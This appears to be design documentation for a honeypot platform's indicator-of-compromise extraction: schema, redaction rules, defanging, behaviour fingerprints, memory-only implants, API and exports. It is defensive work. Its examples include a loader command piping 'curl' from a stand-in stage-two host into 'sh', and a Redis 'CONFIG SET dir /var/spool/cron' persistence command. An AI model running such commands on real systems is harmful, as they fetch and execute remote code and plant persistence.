# Indicators of compromise

Status: extraction, schema, API and golden fixtures in place. Owner: #34.

Related: attempts ([attempts.md](attempts.md), #25), the attempt timeline ([attempt-timeline.md](attempt-timeline.md), #10), confidence ([confidence.md](confidence.md), #27), enrichment ([enrichment.md](enrichment.md), #11), vulnerable-path hooks ([instrumentation.md](instrumentation.md), #32), canaries ([canaries.md](canaries.md), #17), privacy and retention ([privacy-and-retention.md](privacy-and-retention.md), #16), contribute-back ([contribute-back.md](contribute-back.md), #37). Consumers: exports (#13), campaigns (#33) and the radar (#35).

An IOC is a value someone else can use to spot the same activity: an address, a name, a URL, an exact request string, a hash, a command line or a behaviour fingerprint. Foiled pulls IOCs out of [attempts](attempts.md) and the capture events they were built from, deduplicates them per value, links each one back to its attempts and campaigns, and scores it with the confidence layer.

The contract is [`schemas/ioc.schema.json`](../schemas/ioc.schema.json). The code is `foiled_core::ioc` ([crates/core/src/ioc.rs](../crates/core/src/ioc.rs)). Golden fixtures are under [testdata/iocs](../testdata/iocs/memory-only.input.json).

## Contents

- [Principles](#principles)
- [The IOC object](#the-ioc-object)
- [Types and extraction sources](#types-and-extraction-sources)
- [Normalisation, redaction and privacy](#normalisation-redaction-and-privacy)
- [Display and defanging](#display-and-defanging)
- [Deduplication and links to attempts](#deduplication-and-links-to-attempts)
- [ASN context](#asn-context)
- [Behaviour fingerprint format](#behaviour-fingerprint-format)
- [Memory-only implants](#memory-only-implants)
- [Confidence](#confidence)
- [API](#api)
- [Retention](#retention)
- [For exports, campaigns and the radar](#for-exports-campaigns-and-the-radar)
- [Limits](#limits)
- [Tests](#tests)

## Principles

1. **Parse, never run.** Extraction reads stored capture events only. It never fetches a URL, resolves a name, connects to an address or executes a payload to "produce better IOCs" ([threat model](threat-model.md), C22).
2. **Deterministic.** The same attempts and events always give the same IOCs, ids, order and fingerprints, in any input order. IOCs can be recomputed from the evidence at any time.
3. **Hostile values.** Every value came from an attacker. `value` is kept exact for machines; `display` is defanged and escaped for people. Nothing renders `value` as markup.
4. **Honest gaps.** When an implant leaves no file, Foiled says so (`file_ioc_limited`) and reports no file hash. It never invents one.
5. **Minimise.** Secrets and email local parts are removed from values, inline bodies only become IOCs when payload storage is on, and Foiled's own canaries and network are never IOCs.

## The IOC object

| Field | Meaning |
| --- | --- |
| `ioc_id` | `ioc_` plus 24 hex characters of SHA-256 over `type`, a newline and `value`. The same value always has the same id, across attempts, windows and tenants. |
| `type` | One of the [types](#types-and-extraction-sources) below. |
| `value` | The exact normalised value, after [redaction](#normalisation-redaction-and-privacy). At most 2,048 characters. Hostile text. |
| `display` | Defanged and escaped for people. Never parse it. |
| `roles` | What the value was to the attack: `source`, `request`, `payload`, `callback`, `stage2`, `post_exploit`, `behaviour`. One value can hold several, for example a name that was both looked up (`callback`) and fetched from (`stage2`). |
| `origin` | `observed` for everything extraction produces. `enrichment_pivot` is reserved for values found by pivoting on third-party data, which are never contributed back (#37). |
| `redacted` | True when secrets or personal information were removed from `value`. |
| `file_ioc_limited` | True when an attempt this was seen in reached post-exploitation without a captured file. See [memory-only implants](#memory-only-implants). |
| `first_seen`, `last_seen` | Unix ms, over the sightings in the window. |
| `sightings` | Capture events the value was seen in; attempts, for a behaviour fingerprint. |
| `attempt_ids`, `campaign_ids` | The attempts (#25) and campaigns (#33) it was seen in. `campaign_ids` stays empty until campaigns exist. |
| `decoy_ids`, `catalogue_ids` | Where it was seen. |
| `event_ids` | Up to 32 capture event ids, oldest first. |
| `extracted_from` | `channel:field` pairs the value was read from, for example `egress:data.host` or `hook:hook.cmd_lines`. |
| `enrichment` | ASN and country context for addresses ([below](#asn-context)). |
| `fingerprint` | Only on `behaviour_fingerprint`: the format version and the normalised steps that were hashed. |
| `confidence` | The [#27 score](#confidence) for the indicator: score, band, wording, whether it may be published, evidence and caps. |

## Types and extraction sources

Channels are the capture channels from [ADR 0005](adr/0005-capture-layer.md) and `schemas/capture-event.schema.json`. Only events that belong to an attempt are read; orphan guest-side events have no attempt and give no IOCs.

| Type | Value | Role | Extracted from |
| --- | --- | --- | --- |
| `ip` | Canonical IPv4 (`203.0.113.7`). | `source` | `src.ip` on `network`, `application` and `hook` events (the attacker), and on `egress` events from the canary beacon (`data.detector: beacon`, the attacker using a stolen canary, #17). |
| | | `callback` or `stage2` | `dst.ip` on `egress` events from the egress proxy (#4); host part of URLs. |
| `ipv6` | Canonical, compressed IPv6. IPv4-mapped addresses become `ip`. | as `ip` | as `ip`. |
| `domain` | Lower case, trailing dot dropped, at least two labels. | `callback` or `stage2` | `data.host` on `egress`; `data.query` or `data.qname` on `dns` (#4 resolver); host part of URLs. |
| `url` | `http`, `https` or `ftp` URL; scheme and host lower case. | `stage2` or `callback` | `data.url` on `egress`, or built from `data.host`, `data.path`, `data.scheme` and the destination port; URLs inside command lines. |
| `http_path` | Request path and query exactly as sent, after redaction. `/` alone is not an IOC. | `request` | `data.path` on HTTP `application` events (those with `data.method`); `data.request_path` on `hook` events. |
| `http_ua` | User-Agent header, at most 512 characters. | `request` | `data.user_agent` (or `data.ua`) on `application` events and canary beacon hits. |
| `request_substring` | An exact request string. | `request` | Protocol commands on emulator `application` events: `data.command`, then `data.subcommand` when the emulator logs it apart (the Redis emulator does, and leaves it out of `data.args`), then `data.args`: `CONFIG SET dir /var/spool/cron`. Credential arguments are redacted by position (below). |
| | | `payload` | Inline `data.body` (application) and `data.request_slice` (hook), only when `store_payloads` is on (#16). |
| `payload_sha256` | Lower-case SHA-256 hex. | `payload` | `data.body_sha256` and the `payload_ref` hash on `application` events; `data.request_slice_sha256` and the `hook.request_slice_ref` hash on `hook` events (#32). |
| `file_sha256` | Lower-case SHA-256 hex. | `post_exploit` | `data.sha256` and the `payload_ref` hash on `quarantine` events (#9); `data.sha256` on `filesystem` events; hashes in `hook.implant_refs`. |
| `cmdline` | A command the attacker ran or tried, after redaction. | `post_exploit` | `hook.cmd_lines[]` (#32); `data.cmdline` or `data.argv` on `process` events. URLs inside also become `url` and `domain` or `ip` IOCs with role `stage2`. |
| `dns_query` | The exact name the decoy was made to look up. | `callback` | `data.query` or `data.qname` on `dns` events. The same name is also a `domain` IOC, so domain-based exports pick it up. |
| `behaviour_fingerprint` | `bf1:` plus 32 hex characters. | `behaviour` | The attempt's ordered steps. [Format below](#behaviour-fingerprint-format). |

By pipeline:

| Pipeline | IOCs |
| --- | --- |
| Attempts (#25) | Source addresses, behaviour fingerprint, links and `ioc_refs`. |
| HTTP and protocol logs (#9, #30) | `http_path`, `http_ua`, `request_substring`, `payload_sha256`. |
| Vulnerable-path hooks (#32) | `http_path` from the request path, `payload_sha256` from the slice hash, `cmdline` from `cmd_lines`, `file_sha256` from `implant_refs`, and the hook pattern in the fingerprint. |
| Quarantine (#9) | `file_sha256`. |
| DNS capture (#4) | `dns_query` and `domain`. |
| Egress proxy logs (#4) | `ip`, `domain` and `url` for second-stage fetches (`GET`) and callbacks (anything else). |
| Process tracing (#9, v0.2) | `cmdline` and URLs inside it. |
| Canary beacon (#17) | The attacker's address and user agent. The beacon path and the canary are never IOCs. |

## Normalisation, redaction and privacy

Capture data can hold personal information about people who are not the attacker ([privacy-and-retention.md](privacy-and-retention.md#what-foiled-holds-and-why-it-matters)). Extraction follows the #16 defaults:

- **Bodies stay hashed.** With `store_payloads: false` (the default, and what the API uses today) inline bodies and request slices are never IOC values. Their SHA-256 is a `payload_sha256` IOC instead. Request paths, user agents and protocol commands are access-log data and are extracted either way.
- **Secrets are removed from text values** (`http_path`, `http_ua`, `request_substring`, `cmdline`, `url`), keeping their shape:
  - URL passwords: `scheme://user:pw@host` becomes `scheme://user:REDACTED@host`, for any scheme (`http`, `mysql`, `redis`); userinfo without a password (often a token) becomes `REDACTED@host`.
  - The value after a secret-named key in query strings and config lines (`password=x`, `db_password = x`), JSON (`"Password" : "x"`, any case and spacing) and headers (`X-Api-Key: k1 k2`: the whole value up to the end of the line or the closing quote). A name is secret when it contains, ignoring case, `secret`, `token`, `password`, `passwd`, `api-key`, `api_key`, `apikey`, `private_key`, `privatekey`, `signature`, `session`, `sessid`, `credential`, `cookie` or `jwt` (`X-Amz-Signature`, `apiToken`), when one of its parts (split on `-`, `_` and camel case) is `auth`, `authorization`, `pass`, `pwd`, `sig` or `sid` (`X-Auth-Token`, `basic_auth`, `db_pass`), or when it is exactly `key`.
  - Not redacted, to keep useful values: names where those letters are part of another word (`author=`, `passport=`), setting words after a secret-named key (`PasswordAuthentication=no`; `yes`, `no`, `true`, `false`, `on`, `off`, `none`, `null`), and `host:port` (a header needs a space after the colon, so `auth-server:8080` stays).
  - The word after `--password`, `--pass`, `--token`, `--secret`, `--api-key`, `-pass`, `-passin`, `-passout` and `Bearer`, for any program.
  - The password half of `-u`, `--user`, `--proxy-user` and `-U` values: `curl -u admin:REDACTED`, `smbclient -U admin%REDACTED`.
  - Password flags of particular programs, found as the first word of each command (after `sudo`, `env` and similar, and inside `sh -c '...'`): `mysql`, `mysqldump`, `mysqladmin`, `mariadb` and `7z` `-pPW` (`-pREDACTED`; a bare `-p` prompts and is kept); `sshpass -p PW` and `-pPW`; `redis-cli -a PW`; `mosquitto_pub` and `mosquitto_sub -P PW`; `zip` and `unzip -P PW`. Other programs keep their flags (`mkdir -p`, `ssh -p 2222`).
  - Protocol command arguments by position: `AUTH [user] PW` and `LOGIN [user] PW` (the password), `PASS PW`, `HELLO ... AUTH user PW`, `MIGRATE ... AUTH PW` and `... AUTH2 user PW`, `CONFIG SET` values of `requirepass`, `masterauth` and other secret-named parameters, and `ACL SETUSER` password rules (`>PW`, `<PW`, `#hash`, `!hash`). `HELLO 3 AUTH default pw` becomes `HELLO 3 AUTH default REDACTED`.
- **Email local parts are removed**, plain or URL-encoded: `ops@example.invalid` becomes `REDACTED@example.invalid` and `ops%40example.invalid` becomes `REDACTED%40example.invalid`.
- `redacted: true` marks every IOC whose value was changed, so exports know it is not byte-exact. The id is computed over the redacted value, so it is still stable.
- **Canaries are never IOCs.** Any value containing a canary prefix (`vt-canary-`, `vt_canary_`, `VTCANARY`, `vtcanary`), the planted database host or the `canary_id` of the event is skipped. They are Foiled's own secrets, and contribute-back must never publish them ([contribute-back.md](contribute-back.md#what-a-released-ioc-contains)).
- **The decoy's own network and the platform are never IOCs.** Private, loopback, link-local (including the cloud metadata address `169.254.169.254`), carrier-grade NAT, unique local (`fd00::/8`), multicast and unspecified addresses are skipped, using the same rule as enrichment. The rule applies to bare addresses and to URL hosts. IPv4 is read the way `inet_aton` and WHATWG URL parsing read it, so every form that reaches the same address is caught: octal (`0251.0376.0251.0376`, `0177.0.0.1`), hexadecimal per part (`0xa9.0xfe.0xa9.0xfe`) or whole (`0xa9fea9fe`), a single number (`2852039166`) and short forms where the last part fills the remaining bytes (`127.1`, `169.254.43518`). Trailing root dots are ignored before every check (`169.254.169.254.`, `metadata.google.internal.`, `localhost.`). Local names are skipped as domains, DNS queries and URL hosts: single-label names, `localhost`, and names under `.localhost`, `.local`, `.internal` (which covers `metadata.google.internal`), `.home.arpa`, `.lan`, `.localdomain`, `.in-addr.arpa` and `.ip6.arpa`.
- Values longer than 2,048 characters (512 for user agents) are dropped rather than cut, because a cut value is no longer exact. The hash of the request or file still stands.

## Display and defanging

`display` is what the console, tickets and text exports show:

| Type | `value` | `display` |
| --- | --- | --- |
| `ip` | `203.0.113.50` | `203[.]0[.]113[.]50` |
| `ipv6` | `2001:db8:1::25` | `2001[:]db8[:]1[:][:]25` |
| `domain`, `dns_query` | `stage2.example.invalid` | `stage2[.]example[.]invalid` |
| `url` | `http://stage2.example.invalid/m.sh` | `hxxp://stage2[.]example[.]invalid/m.sh` |
| text types | `sh -c 'curl -s http://stage2.example.invalid/m.sh \| sh'` | `sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh \| sh'` |

After defanging, `display` goes through the same escaping as timeline summaries (`timeline::printable`): control, bidi, zero-width and line-separator characters become `\u{...}`, and it is cut at 160 characters with `…`. The web console renders it with `toPrintable` and never `dangerouslySetInnerHTML`.

`GET /v0/iocs?value=` accepts defanged input (`[.]`, `[:]`, `hxxp://`, `hxxps://`, `fxp://`) and refangs it before matching.

## Deduplication and links to attempts

- One IOC per type and value. Every sighting adds its event, attempt, decoy and catalogue entry; `first_seen` and `last_seen` cover them all.
- Each attempt keeps at most 256 distinct IOCs; anything beyond is counted in the attempt's notes.
- **`ioc_refs` on attempts** is filled by `ioc::attach_refs` in the API read model: every attempt returned by `/v0/attempts`, `/v0/attempts/{id}` and the timeline carries the ids of its IOCs, in order of first appearance. The links and override routes never return attempts, so they skip extraction. Attaching refs is a single indexed pass, so it stays linear in the number of attempts. `attempt::build` itself still returns empty `ioc_refs`, so the attempt golden files and grouping stay independent of extraction.
- `campaign_ids` copies each attempt's `campaign_id`, so when #33 assigns campaigns the IOCs follow with no change here.

## ASN context

Address IOCs carry ASN and country context from enrichment Facts (#11): the newest `asn.number`, `asn.org` and `geo.country` Fact per provider. Reputation Facts (GreyNoise, CrowdSec, DShield) are triage context for the attempt, not part of the indicator, and are not copied.

Each ref says whether it is `shareable`. `local_asn` is on the never-redistribute list because its dataset may be MaxMind GeoLite2 ([enrichment.md](enrichment.md)), so its refs are `shareable: false`. `ioc::redact_for_export` drops every non-shareable ref through `ioc::export_refs`; exports (#13), the radar (#35) and contribute-back (#37) must call it. The CSV export already does: its `asn`, `as_org` and `country` columns are filled only from refs that pass `export_refs`, so with the default providers they stay empty.

The API asks the store for cached Facts (`Store::enrichment_facts`) for the addresses it is about to return. The in-memory store answers in tests; the Worker store answers nothing until the `foiled-enrich` consumer writes its cache (#11), so production IOCs have no ASN refs until then. The golden test uses the fake ASN table in `testdata/enrichment/asn.csv`.

## Behaviour fingerprint format

A behaviour fingerprint is a stable id for "what the attacker did", independent of where from. It is the IOC that still works when there is no file to hash ([glossary](glossary.md)).

**Value:** `bf1:` followed by the first 16 bytes, in lower-case hex, of

```text
SHA-256( "foiled-behaviour-fingerprint/v1" + "\n" + join("\n", steps) )
```

**Steps.** Each event in the attempt gives zero or more normalised steps. Volatile and attacker-chosen values (addresses, host names, query values, arguments, passwords, keys, file names, ports) are left out, so the same tool gives the same steps from anywhere and no secret or canary can reach a fingerprint.

| Event | Step |
| --- | --- |
| HTTP request (`application` with `method`) | `http <METHOD> <path shape>`. The path shape is the path without query, at most 16 segments. A segment becomes `*` when it holds a digit (other than a short version such as `v2`), is longer than 32 characters, or is 12 or more characters with at least 3.5 bits of entropy per character (random looking). Every segment after an account or credential segment (`login`, `signin`, `auth`, `oauth`, `token`, `session`, `reset`, `verify`, `password`, `key`, `user`, `users`, `u`, `account` and similar) also becomes `*`. Then `?` and the sorted, distinct query parameter names (shaped the same way) joined by `&`. `/api/upload?path=../x&token=1` becomes `/api/upload?path&token`, `/login/hunter0` and `/login/correcthorse` both become `/login/*`, and `/api/v2/upload` stays. |
| Protocol command (`application` with `command`) | `cmd <COMMAND>`, upper case, plus the subcommand: `data.subcommand` when the emulator logs it (the Redis emulator does), otherwise the first argument of commands that take a subcommand (`ACL`, `CLIENT`, `CLUSTER`, `COMMAND`, `CONFIG`, `DEBUG`, `FUNCTION`, `MEMORY`, `MODULE`, `OBJECT`, `SCRIPT`, `XGROUP`, `XINFO`): `cmd CONFIG SET`, `cmd MODULE LOAD`. Other arguments, including `AUTH` passwords and `SET` keys, never appear: `AUTH hunter2` and `AUTH vt-canary-...` both give `cmd AUTH`. |
| Hook (`hook`) | `hook <hook_id> <stage>`, then `exec <program>` for each of `cmd_lines`. |
| Process (`process`) | `exec <program>`. |
| DNS (`dns`) | `dns <QTYPE>` (`A` when missing). |
| Egress (`egress`) | `egress <METHOD>` (`CONNECT` when missing), or `canary beacon` for a beacon hit. |
| File change (`filesystem`) | `fs <op>` (`write` when missing). |
| Quarantine | `quarantine`. |
| Network flows | None. Flows are too noisy to be behaviour. |

`<program>` is the first word's basename (`/bin/sh -c ...` gives `sh`). Every attacker-supplied word in a step (method, command, qtype, op, program, path segment, parameter name) must be at most 24 or 32 characters of letters, digits and `._+-~` and must not name a canary; otherwise it becomes `*`. Every step is escaped with `timeline::printable` before hashing, so the stored steps are exactly the hashed text.

**Order.** Events are ordered by time, then hook `sequence_no`, then their steps (never by event id, which the sender chooses). An event's own steps keep their order. Consecutive repeats are collapsed, so a scanner that sends the same request ten times gives one step. At most 64 steps are hashed.

**When.** Only for attempts past `probe` and with at least two steps. A probe-only fingerprint would match every scanner on the internet.

**Example** (the [memory-only fixture](../testdata/iocs/memory-only.input.json)):

```json
{
  "type": "behaviour_fingerprint",
  "value": "bf1:e5d2f5a92afd8930cbf7518a4983d112",
  "fingerprint": {
    "version": 1,
    "steps": [
      "http GET /admin",
      "http POST /api/upload?path&token",
      "hook demo-app.upload-path-traversal trigger",
      "hook demo-app.upload-path-traversal post_exploit",
      "exec sh",
      "dns A",
      "egress GET",
      "dns TXT"
    ]
  }
}
```

**Versioning.** Any change to the step grammar, normalisation or hash input is a new version (`bf2:`) and a new `FINGERPRINT_VERSION`. Old fingerprints are never recomputed under a new version silently; both can be emitted side by side while consumers move.

**Limits.** Timing jitter between attacker-facing and guest-side events can reorder steps across runs of the same tool, giving different fingerprints. Campaign clustering (#33) should compare `fingerprint.steps` for near matches rather than rely on exact ids alone. #12 sequences are hand-written rules; fingerprints are computed and need no rule.

## Memory-only implants

File-centric intelligence fails when the attacker stays in memory: a loader piped into a shell, a reflective payload, an implant that deletes itself. A missing file hash in that case is a fact about the attack, not a gap to paper over.

**Rule.** An attempt is `file_ioc_limited` when either:

- it reached `post-exploitation` and no `file_sha256` IOC came from it (nothing was quarantined, no `implant_refs`, no file hash on a `filesystem` event), or
- any of its events says `data.memory_only: true` (a hook or the host agent reporting a memory-only implant). This applies even when a dropper file was captured, because the hash covers the dropper and not the implant.

**Effect.**

- The attempt view (`GET /v0/attempts/{id}/iocs`) sets `file_ioc_limited: true` and says why in `notes`.
- Every IOC from that attempt has `file_ioc_limited: true`.
- No `file_sha256` is reported. Foiled never derives a stand-in hash (for example over a command line or a memory region) and labels it as a file.
- Weight moves to what exists: `cmdline`, `behaviour_fingerprint`, and network callbacks (`dns_query`, `domain`, `url`, `ip` with roles `callback` and `stage2`).

**Example.** The [memory-only fixture](../testdata/iocs/memory-only.input.json) is one attempt from `203.0.113.50`: a probe, an upload that reaches the vulnerable path, a loader piped to `sh` (`memory_only: true`), a DNS lookup and blocked fetch of `stage2.example.invalid`, then a TXT lookup of `k7f3q9.cb.example.invalid`. It produces 14 IOCs: the source address with ASN 64498, the user agent, both request paths, the body and slice hashes, the command line, the URL, both domains and DNS queries, the second-stage address, and the behaviour fingerprint. There is no `file_sha256`. The attempt notes read:

> Post-exploitation activity was seen but no file was captured, so the implant may be memory-resident. File IOCs are limited and no file hash is reported; use the command line, behaviour fingerprint and network callback indicators instead.

### Export examples

Exports are #13's to build. These examples fix what they must say for a memory-only attempt; none of them contains a file hash.

JSON, as served by the API and as #13 should pass through (trimmed):

```json
{
  "ioc_id": "ioc_e1b6ef4d11ffdcc323747f8c",
  "type": "cmdline",
  "value": "sh -c 'curl -s http://stage2.example.invalid/m.sh | sh'",
  "display": "sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh'",
  "roles": ["post_exploit"],
  "origin": "observed",
  "file_ioc_limited": true,
  "attempt_ids": ["att_7becbc03c1bf0363d7ce1575"],
  "confidence": { "score": 68, "band": "medium", "wording": "we assess as", "publishable": true }
}
```

CSV, one row per IOC with the limitation spelt out:

```text
indicator_type,indicator,first_seen,last_seen,file_ioc_limited,note
cmdline,sh -c 'curl -s hxxp://stage2[.]example[.]invalid/m.sh | sh',2026-10-18T01:02:04Z,2026-10-18T01:02:04Z,true,memory-resident implant: no file hash available
behaviour_fingerprint,bf1:e5d2f5a92afd8930cbf7518a4983d112,2026-10-18T01:02:03Z,2026-10-18T01:02:10Z,true,memory-resident implant: no file hash available
url,hxxp://stage2[.]example[.]invalid/m.sh,2026-10-18T01:02:04Z,2026-10-18T01:02:05Z,true,memory-resident implant: no file hash available
```

STIX 2.1 (sketch for #13): network and command-line IOCs become `indicator` objects with patterns (`[url:value = '...']`, `[domain-name:value = '...']`, `[process:command_line = '...']`). The behaviour fingerprint has no STIX observable type, so it becomes an `indicator` with `pattern_type: "foiled-bf"` and the steps in `description`, plus an `x_foiled_file_ioc_limited: true` property. No `file` SCO and no `[file:hashes...]` pattern is emitted. A `note` object on the bundle carries the attempt note above.

MISP (sketch for #13): attributes `ip-dst`, `domain`, `url`, `user-agent`, `text` (command line, category "Payload installation"), and `text` with comment "foiled behaviour fingerprint" for `bf1:` values. The event gets the tag `foiled:file-ioc-limited` and the attempt note as an event comment. No `sha256` or `filename|sha256` attribute.

## Confidence

Each IOC is scored with the #27 model as a link of kind `attempt_ioc` (target: the IOC id). The question is "how strongly does this value indicate malicious activity", not "how unique is it to one actor"; uniqueness is campaign work (#33).

| Evidence | Source | Weight |
| --- | --- | --- |
| Seen at a decoy, which has no legitimate users | `catalogue_prior` | 100 (adds 10) |
| Seen in an attempt where a vulnerable-path hook fired at `trigger` | `vuln_path_hook` | 100 (adds 60) |
| Seen in an attempt where a tier 1 signature matched | `rule` | 100 (adds 30) |
| Lowest noise score of the attempts it was seen in | `noise_score` | the score (subtracts up to 20) |

At most 16 decoys and 16 attempts add evidence. The usual #27 rules apply: decoy evidence alone is `catalogue_only` and never publishable, the noise penalty cannot cancel a hook or signature, and wording is "we assess as" until an analyst confirms.

**No per-attempt overrides.** An IOC is one value scored across every attempt it was seen in, so `POST /v0/attempts/{attempt_id}/links` refuses kind `attempt_ioc` with 400, and the override `kind` enum in OpenAPI and the `link_overrides` CHECK constraint (`migrations/postgres/0003_link_overrides.sql`) leave it out on purpose. Analyst feedback on indicators belongs with the review queue (#35), which would key it by `ioc_id`, not attempt.

Worked numbers: a source that only probed one product scores 10 for the decoy, less 2 for a noise score of 10, so 8 (`low`, not publishable). Every IOC in the memory-only fixture scores 10 plus 60 for the hook, less 2: 68 (`medium`, publishable). A generic user agent such as `curl/8.0` scores the same as a rare one in the same attempt; consumers that want rarity should weigh `sightings` and campaign data.

## API

All read-only, tenant-scoped by the caller's token, scope `iocs:read` ([OpenAPI](../api/openapi.yaml)). Like attempts, IOCs are built on request from the capture events in a window (default the last 7 days, at most 31 days and 20,000 events, `truncated` set when the cap is hit).

- `GET /v0/iocs`: filters `since`, `until`, `type`, `value` (exact, defanged input accepted, case-insensitive for addresses, names, hashes and fingerprints), `role`, `attempt_id`, `campaign_id`, `file_ioc_limited`, `limit`. Newest activity first.
- `GET /v0/iocs/{ioc_id}`.
- `GET /v0/attempts/{attempt_id}/iocs`: the attempt's IOCs in `ioc_refs` order, with `file_ioc_limited` and `notes`.

```sh
curl -sS -H "authorization: Bearer $FOILED_TOKEN" \
  "$FOILED_API/v0/iocs?type=url&value=hxxp://stage2%5B.%5Dexample%5B.%5Dinvalid/m.sh"
```

`GET /v0/exports/iocs.csv` (#22) still exports source addresses only, now with trailing `asn`, `as_org` and `country` columns that only ever hold shareable context (see [ASN context](#asn-context)). #13 replaces it with full IOC exports built on this model.

## Retention

IOCs are derived, not stored: they are recomputed from live capture events, so once the purge job removes an attempt's events (`attempt` TTL, 90 days by default) its IOCs are gone too, and nothing purged comes back ([privacy-and-retention.md](privacy-and-retention.md#exports-after-purge)). Hash IOCs outlive the R2 objects they name: a `payload_sha256` or `file_sha256` stays valid after the bytes are purged under the shorter `access_log` and `quarantine_file` TTLs. If IOCs are materialised into a table later, that table takes the `attempt` TTL and the same legal holds.

## For exports, campaigns and the radar

- **Exports (#13)** consume `Ioc` as is: map `type` to STIX observables or MISP attribute types, emit `display` in human formats and `value` in machine formats, call `redact_for_export`, carry `file_ioc_limited` and the attempt notes, and use `confidence.wording`. `redacted: true` values must not be presented as byte-exact.
- **Campaigns (#33)** cluster on shared `ioc_id`s (stable across tenants and windows), especially `behaviour_fingerprint`, `payload_sha256`, `url` and `domain`, and write `campaign_id` on attempts, which flows into `campaign_ids`.
- **Radar (#35) and contribute-back (#37)** release only `origin: observed` IOCs with `confidence.publishable`, after `redact_for_export`, the delay and TLP rules, and the canary and secret checks in [contribute-back.md](contribute-back.md#what-a-released-ioc-contains).

## Limits

| Limit | Value |
| --- | --- |
| Value length | 2,048 characters (512 for `http_ua`) |
| Event ids listed per IOC | 32 (`sightings` counts all) |
| IOCs per attempt | 256 |
| URLs per command line | 8 |
| Fingerprint steps | 64 |
| Attempts and decoys adding confidence evidence | 16 each |

Redaction, defanging and extraction are linear in the input; there is no regular expression engine and no quadratic scan of attacker text.

## Tests

- `crates/core/src/ioc.rs`: unit tests for redaction (including a hostile 200,000-character input), defanging and refanging, canary and private address exclusion, payload storage gating, memory-only handling, fingerprint stability across sources and input order, deduplication, confidence and export redaction.
- `crates/emulators/tests/redis_iocs.rs`: runs a credential-heavy session through the real Redis emulator over loopback and checks that [redis-emulator.input.json](../testdata/iocs/redis-emulator.input.json) is exactly its output (volatile ids, times, addresses and ports pinned), then that extraction keeps the password out and shapes steps from `data.subcommand`. Regenerate with `FOILED_BLESS=1` when the emulator changes.
- `crates/lint/tests/iocs.rs`: golden test. [memory-only.input.json](../testdata/iocs/memory-only.input.json), [file-drop.input.json](../testdata/iocs/file-drop.input.json) and the Redis emulator fixture are grouped, extracted and enriched with the fake ASN table; the output must match `testdata/iocs/expected/` (one file per IOC, validated against the schema by `foiled-lint`). It also checks the #34 validation case (IP with ASN, user agent, domain and URL, behaviour fingerprint, no file hash) and that the fixtures cover every type. Regenerate with `FOILED_BLESS=1` and review the diff.
- `crates/api/tests/iocs.rs`: the three endpoints, tenant isolation, scopes, filters, ASN context, `ioc_refs` on attempts and timelines, the CSV export guard on never-redistribute ASN data, and the refusal of `attempt_ioc` overrides.
